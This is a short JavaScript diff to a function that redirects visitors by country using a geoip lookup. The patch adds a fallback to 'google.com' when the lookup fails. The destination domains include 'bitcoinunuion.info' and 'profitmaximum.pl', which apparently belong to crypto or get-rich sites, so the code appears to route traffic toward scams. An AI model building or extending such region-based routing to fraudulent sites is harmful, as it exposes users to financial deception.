@@ -29,8 +29,10 @@ module.exports.getUrl = async function (req, res) {
 }
 
 function checkCountry(ip) {
-    // if (ip === '::1') ip = '207.97.227.239';
     let geo = geoip.lookup(ip);
+    if (geo === null) {
+        url = 'google.com'
+    } else {
     switch (geo.country) {
         case "CN":
             return url = 'bitcoinunuion.info'
@@ -44,6 +46,7 @@ function checkCountry(ip) {
             return url = 'profitmaximum.pl'
         default:
             return url = 'test.com';
+    }
     }
     return url
 }
